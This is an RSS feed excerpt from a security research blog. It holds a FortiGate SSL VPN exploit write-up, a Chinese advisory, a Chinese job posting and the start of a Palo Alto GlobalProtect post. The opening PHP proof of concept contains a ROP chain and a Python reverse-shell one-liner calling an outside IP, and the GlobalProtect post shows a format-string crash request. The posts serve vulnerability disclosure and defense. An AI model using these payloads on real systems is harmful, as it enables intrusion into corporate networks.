      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$junk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x110fa15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1bed1f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// pop rax ; ret ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x04410f6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// add rdi, rax ; mov eax, dword [rdi] ; ret  ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1366639&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// call system ;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;python -c &#39;import socket,sys,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((sys.argv[1],12345));[os.dup2(s.fileno(),x) for x in range(3)];os.system(sys.argv[2]);&#39; xx.xxx.xx.xx /bin/sh;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;AAAAAAAA&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;512&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// offset&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_repeat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;A&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
      &lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript:void(0);&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;xxx&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
    &lt;p&gt;The PoC can be divided into three parts.&lt;/p&gt;
    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Fake SSL structure&lt;br /&gt;
 The SSL structure has a regular offset to our buffer, so we can forge it precisely. In order to avoid the crash, we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt; to a place containing a void function pointer. The parameter at this time is SSL structure itself &lt;code class=&quot;highlighter-rouge&quot;&gt;s&lt;/code&gt;. However, there is only 8 bytes ahead of &lt;code class=&quot;highlighter-rouge&quot;&gt;method&lt;/code&gt;. We cannot simply call &lt;code class=&quot;highlighter-rouge&quot;&gt;system(&quot;/bin/sh&quot;);&lt;/code&gt; on the HTTP server, so this is not enough for our reverse shell command. Thanks to the huge binary, it is easy to find ROP gadgets. We found one useful for stack pivot:&lt;/p&gt;

        &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; push rbx ; or byte [rbx+0x41], bl ; pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret ;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
        &lt;p&gt;So we set the &lt;code class=&quot;highlighter-rouge&quot;&gt;handshake_func&lt;/code&gt; to this gadget, move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rsp&lt;/code&gt; to our SSL structure, and do further ROP attack.&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;ROP chain&lt;br /&gt;
 The ROP chain here is simple. We slightly move the &lt;code class=&quot;highlighter-rouge&quot;&gt;rdi&lt;/code&gt; forward so there is enough space for our reverse shell command.&lt;/li&gt;
      &lt;li&gt;Overflow string&lt;br /&gt;
 Finally, we concatenates the overflow padding and exploit. Once we overflow an SSL structure, we get a shell.&lt;/li&gt;
    &lt;/ol&gt;

    &lt;p&gt;Our exploit requires multiple attempts because we may overflow something important and make the program crash prior to the &lt;code class=&quot;highlighter-rouge&quot;&gt;SSL_do_handshake&lt;/code&gt;. Anyway, the exploit is still stable thanks to the reliable watchdog of Fortigate. It only takes 1~2 minutes to get a reverse shell back.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;demo&quot;&gt;Demo&lt;/h1&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/Aw55HqZW4x0&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h1 id=&quot;timeline&quot;&gt;Timeline&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;11 December, 2018 Reported to Fortinet&lt;/li&gt;
  &lt;li&gt;19 March, 2019 All fix scheduled&lt;/li&gt;
  &lt;li&gt;24 May, 2019 All advisory released&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;fix&quot;&gt;Fix&lt;/h1&gt;
&lt;p&gt;Upgrade to FortiOS 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above.&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/</link>
                <guid>https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Fortigate SSL VPN 資安通報</title>
                <description>&lt;h3 id=&quot;內容&quot;&gt;內容&lt;/h3&gt;

&lt;p&gt;上一篇 SSL VPN 研究系列文我們通報了在 &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;Palo Alto GlobalProtect 上的 RCE 弱點&lt;/a&gt;，這一篇將公開我們在 Fortigate SSL VPN 上的研究，共計找到下列五個弱點：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2018-13379: Pre-auth arbitrary file reading&lt;/li&gt;
  &lt;li&gt;CVE-2018-13380: Pre-auth XSS&lt;/li&gt;
  &lt;li&gt;CVE-2018-13381: Pre-auth heap overflow&lt;/li&gt;
  &lt;li&gt;CVE-2018-13382: The magic backdoor&lt;/li&gt;
  &lt;li&gt;CVE-2018-13383: Post-auth heap overflow&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;透過不需認證的任意讀檔問題(CVE-2018-13379)加上管理介面上的 heap overflow(CVE-2018-13383)，惡意使用者可直接取得 SSL VPN 的最高權限。&lt;/p&gt;

&lt;p&gt;此外，我們也發現了一個官方後門(CVE-2018-13382)，可以任意修改使用者密碼。&lt;/p&gt;

&lt;p&gt;在回報 Fortigate 後，官方已陸續修復這些弱點，建議 Fortigate SSL VPN 的用戶更新至最新版。&lt;/p&gt;

&lt;h3 id=&quot;細節&quot;&gt;細節&lt;/h3&gt;

&lt;p&gt;詳細的技術細節請參閱我們的 Advisory：&lt;br /&gt;
&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;這系列 VPN 研究也得到了今年 BlackHat 2019 Pwnie Awards 的 &lt;a href=&quot;https://pwnies.com/winners/&quot;&gt;pwnie for best server-side bug&lt;/a&gt;（年度最佳伺服器漏洞）。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/</link>
                <guid>https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory</guid>
                <pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>[已結束] DEVCORE 徵求行政專員</title>
                <description>&lt;p&gt;戴夫寇爾即將滿七年了，過去我們不斷地鑽研進階攻擊技巧，為許多客戶提供高品質的滲透測試服務，也成為客戶最信賴的資安伙伴之一。在 2017 年我們更成為第一個在台灣推出紅隊演練服務的本土廠商，透過無所不用其極的駭客思維，陸續為電子商務、政府部門、金融業者執行最真實且全面的攻擊演練，同時也累積了豐富的經驗與案例，成為台灣紅隊演練實力最深厚的服務供應商。&lt;/p&gt;

&lt;p&gt;在 2015 年我們曾經公開徵求一位行政出納人才，後來經過層層的履歷審核、筆試、面試，終於順利找到一位經驗豐富且值得信賴的生活駭客，成為我們最強而有力的後勤伙伴。但是隨著團隊人數增長、業務規模大幅增加、事務分工專業化，行政部門的眾多工作已經無法由單一人力獨自負荷。&lt;/p&gt;

&lt;p&gt;因此今年我們再度公開招募行政人才，希望能夠找到一位行政專員，擴大我們的後勤能量，鞏固戴夫寇爾的團隊作戰能力，讓我們持續為企業提供最優異的資安服務。&lt;/p&gt;

&lt;p&gt;我們非常渴望您的加入，若您有意成為戴夫寇爾的一員，可參考下列職缺細節：&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;工作內容&quot;&gt;工作內容&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;庶務性行政工作 50%
    &lt;ul&gt;
      &lt;li&gt;人員接待，例如：電話接聽、來訪人員接待&lt;/li&gt;
      &lt;li&gt;文件收發，例如：郵務作業、快遞服務&lt;/li&gt;
      &lt;li&gt;檔案管理，例如：名片掃描、合約掃描、範本檔案格式調整&lt;/li&gt;
      &lt;li&gt;資料蒐集，例如：各類公司業務需求資料查找&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;總務工作 20%
    &lt;ul&gt;
      &lt;li&gt;辦公室各類用品採買&lt;/li&gt;
      &lt;li&gt;辦公室環境維護&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;採購工作 15%
    &lt;ul&gt;
      &lt;li&gt;設備採購管理&lt;/li&gt;
      &lt;li&gt;服務供應商管理&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;人事工作 5%
    &lt;ul&gt;
      &lt;li&gt;保險事務，例如：團體保險、旅遊不便險&lt;/li&gt;
      &lt;li&gt;差旅行程，例如：交通票券訂購、簽證辦理&lt;/li&gt;
      &lt;li&gt;教育訓練安排&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;其他主管交辦事項 10%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作時間&quot;&gt;工作時間&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;工作地點&quot;&gt;工作地點&lt;/h3&gt;
&lt;p&gt;台北市中山區復興北路 168 號 10 樓&lt;br /&gt;
（捷運南京復興站 8 號出口，走路約 3 分鐘）&lt;/p&gt;

&lt;h3 id=&quot;人格特質偏好&quot;&gt;人格特質偏好&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;細心嚴謹，能耐心的處理繁瑣的庶務工作。&lt;/li&gt;
  &lt;li&gt;主動積極，看到我們沒發現的細節，超越我們所期望的基準。&lt;/li&gt;
  &lt;li&gt;懂得溝通傾聽，能同理他人，找出彼此共識。&lt;/li&gt;
  &lt;li&gt;擅長邏輯思考，懂得透過淺顯易懂且條理清晰的方式傳達自己的想法。&lt;/li&gt;
  &lt;li&gt;良好的時間管理能力，依據任務的優先順序，有效率的完成每項交辦。&lt;/li&gt;
  &lt;li&gt;勇於接受挑戰且具備解決問題的能力，努力克服未知的難題。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作條件要求&quot;&gt;工作條件要求&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;需有三年以上行政相關工作經驗&lt;/li&gt;
  &lt;li&gt;熟悉 Google Sheets 操作，且具獨立撰寫試算表公式的能力&lt;/li&gt;
  &lt;li&gt;習慣使用雲端服務，如：Google Drive, Dropbox 或其他&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您使用過專案管理系統，如：Trello, Basecamp, Redmine 或其他&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您將會使用專案管理系統管理平日任務。&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是 MAC 使用者&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您未來的電腦會是 MAC，我們希望您越快順暢使用電腦越好。&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是生活駭客&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您不需要會寫程式，但您習慣觀察生活中的規律，並想辦法利用這些規律有效率的解決問題。&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您會在一個開闊的辦公環境工作&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;您會擁有一張 Aeron 人體工學椅&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣&lt;br /&gt;
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司福利&quot;&gt;公司福利&lt;/h3&gt;
&lt;p&gt;我們注重公司每位同仁的身心健康，請參考以下福利制度：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;休假福利
    &lt;ul&gt;
      &lt;li&gt;到職即可預支當年度特休&lt;/li&gt;
      &lt;li&gt;每年五天全薪病假&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;獎金福利
    &lt;ul&gt;
      &lt;li&gt;三節禮金（春節、端午節、中秋節）&lt;/li&gt;
      &lt;li&gt;生日禮金&lt;/li&gt;
      &lt;li&gt;婚喪補助&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;休閒福利
    &lt;ul&gt;
      &lt;li&gt;員工旅遊&lt;/li&gt;
      &lt;li&gt;舒壓按摩&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;美食福利
    &lt;ul&gt;
      &lt;li&gt;零食飲料&lt;/li&gt;
      &lt;li&gt;員工聚餐&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;健康福利
    &lt;ul&gt;
      &lt;li&gt;員工健康檢查&lt;/li&gt;
      &lt;li&gt;運動中心健身券&lt;/li&gt;
      &lt;li&gt;團體保險&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;進修福利
    &lt;ul&gt;
      &lt;li&gt;內部教育訓練&lt;/li&gt;
      &lt;li&gt;外部進修課程&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;其他
    &lt;ul&gt;
      &lt;li&gt;專業的公司團隊&lt;/li&gt;
      &lt;li&gt;扁平的內部組織&lt;/li&gt;
      &lt;li&gt;順暢的溝通氛圍&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;起薪範圍&quot;&gt;起薪範圍&lt;/h3&gt;
&lt;p&gt;新台幣 34,000 - 40,000 （保證年薪 14 個月）&lt;/p&gt;

&lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;請將您的履歷以 PDF 格式寄到 recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.docx&quot;&gt;DOC&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit2019/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。 若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;標題格式：&lt;strong&gt;[應徵] 行政專員 您的姓名&lt;/strong&gt;（範例：[應徵] 行政專員 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在兩頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;工作經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;我們會在兩週內主動與您聯繫，招募過程依序為書面審核、線上測驗以及面試三個階段。最快將於八月中進行第二階段的線上測驗，煩請耐心等候。&lt;br /&gt;
由於最近業務較為忙碌，若有應徵相關問題，請一律使用 Email 聯繫，造成您的不便請見諒。&lt;/p&gt;

&lt;p&gt;我們選擇優先在部落格公布徵才資訊，是希望您也對資訊安全議題感興趣，即使不懂技術也想為台灣資安盡一點力。無論如何，我們都感謝您的來信，期待您的加入！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/07/23/devcore-201907-recruit/</link>
                <guid>https://devco.re/blog/2019/07/23/devcore-201907-recruit</guid>
                <pubDate>Tue, 23 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;

&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Don’t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;

&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;

&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;

&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;

&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;

&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;

&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
        &amp;lt;clientcert-response&amp;gt;
                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
        &amp;lt;/clientcert-response&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;

scep-profile-name=%n%n%n%n%n...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;

&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

